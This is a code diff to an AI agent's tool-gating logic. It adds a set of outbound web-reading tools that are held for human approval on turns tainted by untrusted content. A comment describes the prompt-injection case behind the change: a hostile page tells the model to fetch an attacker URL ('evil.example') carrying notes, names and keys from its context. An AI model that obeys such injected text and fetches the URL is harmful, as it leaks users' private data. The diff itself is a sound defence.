@@ -782,6 +782,19 @@ READ_ONLY_TOOLS = frozenset({
 #: `test_the_refusers_really_do_refuse` holds the two in step.
 REFUSE_WHEN_TAINTED = frozenset({"remember", "forget", "undo_last_action"})
 
+#: Reads that reach OUTSIDE the house, and so can carry something out. They
+#: are read-only — a fetch changes nothing here — but on a tainted turn they
+#: are the exfiltration channel: a page the model has read can tell it to
+#: fetch `https://evil.example/?k=<what the prompt holds>`, and a read-only
+#: tool that runs without a human would carry the notes, the names and the
+#: keys in the context out in the URL. So on a tainted turn these are HELD
+#: like an action (M109): a person sees the URL and says yes or no. On a
+#: clean turn they run as the reads they are. Enforced here, in the gate,
+#: not in the prompt; `test_the_taint_table` holds every tool to it.
+OUTBOUND_READERS = frozenset({
+    "web_search", "web_fetch", "web_browse", "web_crawl", "read_page", "feed_latest",
+})
+
 
 GateCheck = Callable[[dict[str, Any]], bool]
 TargetPin = Callable[[dict[str, Any]], dict[str, Any]]
@@ -1309,6 +1322,10 @@ class ToolRegistry:
             and tool.name not in REFUSE_WHEN_TAINTED
             and self._is_tainted(context)
         ):
+            return True
+        # A read that reaches outside the house is the way out for what a
+        # hostile page wants carried: held on a tainted turn (M109).
+        if tool.name in OUTBOUND_READERS and self._is_tainted(context):
             return True
         if tool.gate is not None:
             try:
